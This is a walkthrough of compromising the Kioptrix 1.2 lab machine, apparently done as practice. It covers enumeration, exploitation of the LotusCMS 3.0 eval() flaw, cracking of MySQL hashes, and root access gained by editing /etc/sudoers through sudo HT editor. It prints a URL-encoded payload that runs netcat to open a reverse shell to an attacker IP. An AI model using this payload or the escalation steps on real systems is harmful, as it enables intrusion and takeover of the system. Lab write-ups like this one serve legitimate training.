**Vulnerable System**: Kioptrix 1.2 (Level 3)
=============================================

**Operating System**: Ubuntu 8.04

**Kernel**: 2.6.24

**Vulnerability Exploited**: LotusCMS 3.0 - 'eval()' Remote Command Execution

*Python Script Exploit*

**Exploit Used**: LotusCMS 3.0 PHP Code Execution

**Proof of Concept Code**:
<https://packetstormsecurity.com/files/122161/LotusCMS-3.0-PHP-Code-Execution.html>

*Manual Exploit*

**Exploit Used**: Manual Exploit Based on: LotusCMS 3.0 - 'eval()' Remote
Command Execution (Metasploit)

**Proof of Concept Code**:
http://kioptrix3.com/index.php?page=index%27)%3B%24{system(%27nc+-e+%2Fbin%2Fsh+\<ip
address\>+\<port number\>%27)}%3B%23

**Vulnerability Explained**: An attacker can exploit this vulnerability to
execute local commands through the webserver’s URL. This allowed the attacker to
gain remote access to and compromise the system.

**Vulnerability fix**: Currently no fixes or patches are available.

**Severity**: **Medium**

**Vulnerability Exploited:** Plaintext MySQL credentials found in configuration
file.

**Vulnerability Explained**: Plaintext credentials were found in configuration
file on the webserver. These credentials further granted access to MySQL
databases where other user credentials were found.

V**ulnerability Fix**: The user’s credentials in configuration files should be
hashed and the plaintext password stored in a secure location.

**Severity**: Low

**Vulnerability Exploited**: Weak Passwords, Reused passwords.

**Vulnerability Explained**: User passwords found in MySQL databases were easily
crackable via a dictionary attack.

**Vulnerability Fix**: Enforce strong password policy, use different passwords
for different applications.

**Severity**: Medium

**Privilege Escalation Vulnerability**: sudo access via HT editor

**Exploit Used**: N/A

**Proof of Concept Code**: N/A

**Privilege Escalation Vulnerability Explained:** loneferret’s account had sudo
privileges for executing HT editor. HT Editor was used to edit /etc/sudoers file
to grant privileged shell for user loneferret. This allowed the attacker to gain
administrative privileges and completely compromised the system.

**Vulnerability fix**: Follow the principal of the least privileges and only
grant as little privileges as needed to do the required job.

**Severity**: **High**

Methodology
-----------

-   Host Discovery (netdiscover)

-   Port Scanning (nmap)

-   Web Port Enumeration (nikto, gobuster, browser)

-   Discovered LotusCMS Code Execution Vulnerability (google)

-   Discovered LotusCMS Code Execution Vulnerability (searchsploit/exploit-db)

-   Low Privilege Shell Gained (netcat)

-   Privilege Escalation Enumeration (uname, cat /etc/\*-release, cat
    /etc/passwd)

-   Discovered MySQL Credentials (gconfig.php)

-   Discovered User Hashed passwords (MySQL)

-   Cracked MySQL hashes (Hashkiller)

-   Obtained SSH Shell (loneferret’s credentials)

-   Discovered Application Running with High Privileges (sudo -l)

-   Granted Higher Privileges to loneferret user (/etc/sudoers)

-   Obtained Administrative Privileges (sudo /bin/bash)

Netdiscover
-----------

Discovering the vulnerable system with netdiscover -r 192.168.20.0/24

![](media/c98ca3235f64defb3e1b206823c2c3d8.png)

Nmap
----

Nmap all ports scan:

![](media/bdebc9a1622bda702de59d1a8cba6d89.png)

Nmap version, default script and aggressive scan:

![](media/739507f2663cc7110a8813b0d09bb6e1.png)

Port 80 Enumeration
-------------------

### Nikto

![](media/2d82e3280a41e5d4927f696d88de65ef.png)

### Gobuster

![](media/e2db5d0674e1b48ae129917a22cb698f.png)

### Browser

![](media/8da3660a33818dd35a7dcf9e29b25fc2.png)

Discovering that the underlying software is LotusCMS

![](media/bfe9bcc9e7a42eebe68cb33422a78da8.png)

Low Privilege Shell
-------------------

### Easy way (automated exploit)

Discovering a python exploit via google search:

![](media/edb701ca17a1d481f61c3f74f18e2a51.png)

![](media/6155fb0f7e58682070381f4f75491297.png)

Copying the exploit to the attacking system and running the exploit:

![](media/823af45a6f6724a69f904f0afbe4237e.png)

Low Privilege shell:

![](media/db10a99bf99e9d3a67ef9fd0a1d05dc4.png)

### Harder way (manual exploit)

Searching exploit-db for suitable exploit:

![](media/9195a1ce60a06c2ba762a1cecc4ab2d3.png)

Looking through the source code to see how the exploit works and how the payload
is crafted (notice variable stub and variable sploit):

![](media/5f9f7f18c7833f63030606d18caf8d39.png)

From this we deducted that payload comes after ‘); and between \${payload}
characters.

We can now craft our own malicious payload via URL.

The payload is the following: ');\${system('nc -e /bin/sh 192.168.20.144
443')};\#

First the payload has to be url encoded:

![](media/2546f2b8184e9e9753e86fac0d7ee44f.png)

Next we append our encoded payload to the url after page=index.

<http://kioptrix3.com/index.php?page=index%27%29%3B%24%7Bsystem%28%27nc+-e+%2Fbin%2Fsh+192.168.20.144+443%27%29%7D%3B%23>

After starting netcat listener on port 443 the shell is obtained, and the shell
is upgraded to TTY shell via python:

![](media/f284e16d7cd8817776de38a49302797f.png)

Privilege Escalation
--------------------

Enumerating operating system version and kernel version

![](media/dacc12db4627a588d0dbac117c176332.png)

Enumerating users present on the system:

![](media/b4e2c8f48ebac64ad33959ae5321961b.png)

Enumerating web server directory for MySQL credentials:

![](media/f369b75035676c666dd6b93cb1ce1508.png)

As per screenshot below, MySQL credentials for root have been discovered:

![](media/b4d6773aee437bca7ded63aa3f7f3cbe.png)

Enumerating MYSQL database:

![](media/86c52b8e5b7916d2fde568f1b50349e9.png)

Discovering credentials for users dreg and loneferret:

![](media/d2af5462810fcd83d6f623026b83f75e.png)

Using Hashkiller to bruteforce the hashes found (john can be used, but for quick
unsalted hashes I find Hashkiller to be much quicker)

![](media/d98e3010d010afac24b59cc9d49a7937.png)

Logging into loneferret’s account and discovering his sudo priviliges:

![](media/fcfbfc633c8d078df1586bb7cbe5c141.png)

After a quick google search it’s determined that HT is a hex editor available
for Linux (quick idea to escalate privilege is to edit /etc/sudoers file to add
additional privileges to loneferret’s account):

![](media/73316919a171c027a9e61a5c496e842a.png)

From here SSH can be used to obtain a better shell:

![](media/cd5739e52b3e544e6ec0b80e46ff6c88.png)

When trying to run the executable SSH session prints the following error:

![](media/0a2737d8d822abf8bdcd21b317429200.png)

To overcome this issue, xterminal can be exported with the following command:

export TERM=xterm

Now when sudo ht is ran HT editor application opens:

![](media/6f8a59405647f3b784018ec44f083311.png)

By pressing F3, a file can be opened.

![](media/3f0c051249e0f113fa34bb4c7b1e2f7d.png)

In this case since loneferret already has some sudo privilege, all there is to
do is add extra functionality. To make things easy /bin/bash has been added to
loneferret’s sudo privilege in /etc/sudoers file.

![](media/9a554b6c24b54ce5177a4b416c7eb54b.png)

By pressing F2 the file can be saved.

Once sudo /bin/bash command is executed the root privileges are gained.

![](media/213d2f15adbf0f60c64830dee9eb9354.png)

Congrats.txt:

![](media/0ca82ea2d0f0ab4e291b51f059cacf84.png)
